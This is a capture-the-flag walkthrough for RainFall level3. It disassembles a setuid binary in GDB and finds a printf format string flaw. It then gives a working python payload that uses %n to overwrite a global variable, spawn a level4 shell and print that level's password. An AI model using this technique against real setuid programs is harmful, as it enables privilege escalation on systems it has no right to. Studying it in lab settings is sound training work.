# Level3

## Walkthrough

We list the files in the current home directory.

```bash
level3@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level3 level3   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level3 level3  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level3 level3 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3
-rw-r--r--+ 1 level3 level3   65 Sep 23  2015 .pass
-rw-r--r--  1 level3 level3  675 Apr  3  2012 .profile
level3@RainFall:~$ file level3
level3: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
 dynamically linked (uses shared libs), for GNU/Linux 2.6.24, 
 BuildID[sha1]=0x09ffd82ec8efa9293ab01a8bfde6a148d3e86131, not stripped
```

The file is owned by **level4** and has the **setuid** bit.

We list the functions inside the executable and analyze their assembly code with **GDB**.

```
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048344  _init
0x08048390  printf
0x08048390  printf@plt
0x080483a0  fgets
0x080483a0  fgets@plt
0x080483b0  fwrite
0x080483b0  fwrite@plt
0x080483c0  system
0x080483c0  system@plt
0x080483d0  __gmon_start__
0x080483d0  __gmon_start__@plt
0x080483e0  __libc_start_main
0x080483e0  __libc_start_main@plt
0x080483f0  _start
0x08048420  __do_global_dtors_aux
0x08048480  frame_dummy
0x080484a4  v
0x0804851a  main
0x08048530  __libc_csu_init
0x080485a0  __libc_csu_fini
0x080485a2  __i686.get_pc_thunk.bx
0x080485b0  __do_global_ctors_aux
0x080485dc  _fini
```

There are 2 interesting functions: `main()` and `v()`.

```
(gdb) disas main
Dump of assembler code for function main:
   0x0804851a <+0>:     push   ebp
   0x0804851b <+1>:     mov    ebp,esp
   0x0804851d <+3>:     and    esp,0xfffffff0
   0x08048520 <+6>:     call   0x80484a4 <v>
   0x08048525 <+11>:    leave
   0x08048526 <+12>:    ret
End of assembler dump.
```

The `main()` function only calls the `v()` function.

```
(gdb) disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:     push   ebp
   0x080484a5 <+1>:     mov    ebp,esp
   0x080484a7 <+3>:     sub    esp,0x218
   0x080484ad <+9>:     mov    eax,ds:0x8049860
   0x080484b2 <+14>:    mov    DWORD PTR [esp+0x8],eax
   0x080484b6 <+18>:    mov    DWORD PTR [esp+0x4],0x200
   0x080484be <+26>:    lea    eax,[ebp-0x208]
   0x080484c4 <+32>:    mov    DWORD PTR [esp],eax
   0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:    lea    eax,[ebp-0x208]
   0x080484d2 <+46>:    mov    DWORD PTR [esp],eax
   0x080484d5 <+49>:    call   0x8048390 <printf@plt>
   0x080484da <+54>:    mov    eax,ds:0x804988c
   0x080484df <+59>:    cmp    eax,0x40
   0x080484e2 <+62>:    jne    0x8048518 <v+116>
   0x080484e4 <+64>:    mov    eax,ds:0x8049880
   0x080484e9 <+69>:    mov    edx,eax
   0x080484eb <+71>:    mov    eax,0x8048600
   0x080484f0 <+76>:    mov    DWORD PTR [esp+0xc],edx
   0x080484f4 <+80>:    mov    DWORD PTR [esp+0x8],0xc
   0x080484fc <+88>:    mov    DWORD PTR [esp+0x4],0x1
   0x08048504 <+96>:    mov    DWORD PTR [esp],eax
   0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:   mov    DWORD PTR [esp],0x804860d
   0x08048513 <+111>:   call   0x80483c0 <system@plt>
   0x08048518 <+116>:   leave
   0x08048519 <+117>:   ret
End of assembler dump.
```

The `v()` function:
- calls `fgets()` to read input into a buffer located at `ebp - 0x208`
- calls `printf()` to print the buffer to stdout
- retrieves the value of a global variable stored at memory address `0x804988c` into the `eax` register
- compares the value of `eax` with `0x40` (64 in decimal) and calls `system("/bin/sh")` if the condition is met

`v()` is vulnerable to a format string vulnerability which occurs when an user input is improperly used as a format string in functions like `printf()`, allowing attackers to manipulate memory, access sensitive data, or execute arbitrary code.  
Our goal is to overwrite the value stored at the address `0x804988c` and replace it with the number **64**.

The `printf()` function requests only one mandatory argument. The others, if needed, are also stored on the stack before the call (the first argument being at the top). This means it keeps iterating over the stack as long as it finds a format specifier.  
Furthermore, the function includes the format specifier `%n` which writes the number of printed characters into the address provided as its corresponding argument. If we input a memory address into the format string, and it matches the `%n` specifier, the number of written characters will be stored at this address.

To complete this level, we have to first find the position of the user input on the stack during the call to `printf()` compared to the position its first argument.

```
(gdb) b printf
Breakpoint 1 at 0x8048390
(gdb) r
Starting program: /home/user/level3/level3 
AAAA

Breakpoint 1, 0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
(gdb) stepi
0xb7e78851 in printf () from /lib/i386-linux-gnu/libc.so.6
(gdb) info registers
eax            0xbffff430       -1073744848
ecx            0xb7fda005       -1208115195
edx            0xb7fd28c4       -1208145724
ebx            0xb7fd0ff4       -1208152076
esp            0xbffff418       0xbffff418
ebp            0xbffff638       0xbffff638
esi            0x0      0
edi            0x0      0
eip            0xb7e78851       0xb7e78851 <printf+1>
eflags         0x200292	[ AF SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) x/16wx 0xbffff418
0xbffff418:     0xb7fd0ff4     0x080484da     0xbffff430     0x00000200
0xbffff428:     0xb7fd1ac0     0xb7ff37d0     0x41414141     0xb7e2000a
0xbffff438:     0x00000001     0xb7fef305     0xbffff498     0xb7fde2d4
0xbffff448:     0xb7fde334     0x00000007     0x00000000     0xb7fde000
```

We see that our string represented in hexadecimal as `0x41414141` is located at `0xbffff430`, and we find this address near the top of the stack. We confirm that our format string is in **4th** position in the stack after the first argument passed to `printf()`.

Finally, with the position in mind, we input the target address followed by 3 `%(x)x` format specifiers and our final `%n` in fourth position, for a total of 64 characters.

```bash
level3@RainFall:~$ (python -c "print('\x8c\x98\x04\x08' + '%8x%8x%44x%n')"; cat) | ./level3 
�     200b7fd1ac0                                    b7ff37d0
Wait what?!
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

## Resources

- [Format-String Vulnerability](https://fengweiz.github.io/20fa-cs315/labs/lab3-slides-format-string.pdf)
- [Exploit 101 - Format Strings](https://axcheron.github.io/exploit-101-format-strings)
- [Format String Vulnerability](https://hackinglab.cz/en/blog/format-string-vulnerability)
